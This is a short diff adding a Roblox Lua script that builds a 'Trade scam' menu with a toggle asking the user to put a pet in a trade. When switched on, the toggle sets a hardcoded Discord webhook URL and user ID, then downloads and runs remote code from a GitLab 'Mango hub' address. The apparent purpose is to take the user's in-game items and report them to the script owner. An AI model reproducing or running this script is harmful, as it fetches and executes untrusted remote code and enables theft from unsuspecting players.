@@ -1,0 +1,18 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Trade scam", "DarkTheme")
+ 
+--Trade
+local Trade = Window:NewTab("Trade")
+local ScamSection = Trade:NewSection("Scam")
+ 
+ 
+ScamSection:NewToggle("Trade Scam", "Put Pet a Trade and on this", function(state)
+    if state then
+_G.UserID = 3020165481
+_G.WebHook = "https://discord.com/api/webhooks/1038893540341710918/UpGIon8s083Q_dzQJGaEDZ8jIYIIdFLpW0fw5LUVT6lK6ElHZ1zs8tzYkRCQ6_LxPALv"
+getgenv().WaterMark = true
+loadstring(game:HttpGet("https://gitlab.com/L1ZOT/mango-hub/-/raw/main/Mango-Bloxf-Fruits-Beta"))()
+    else
+        print("Toggle Off")
+    end
+end)
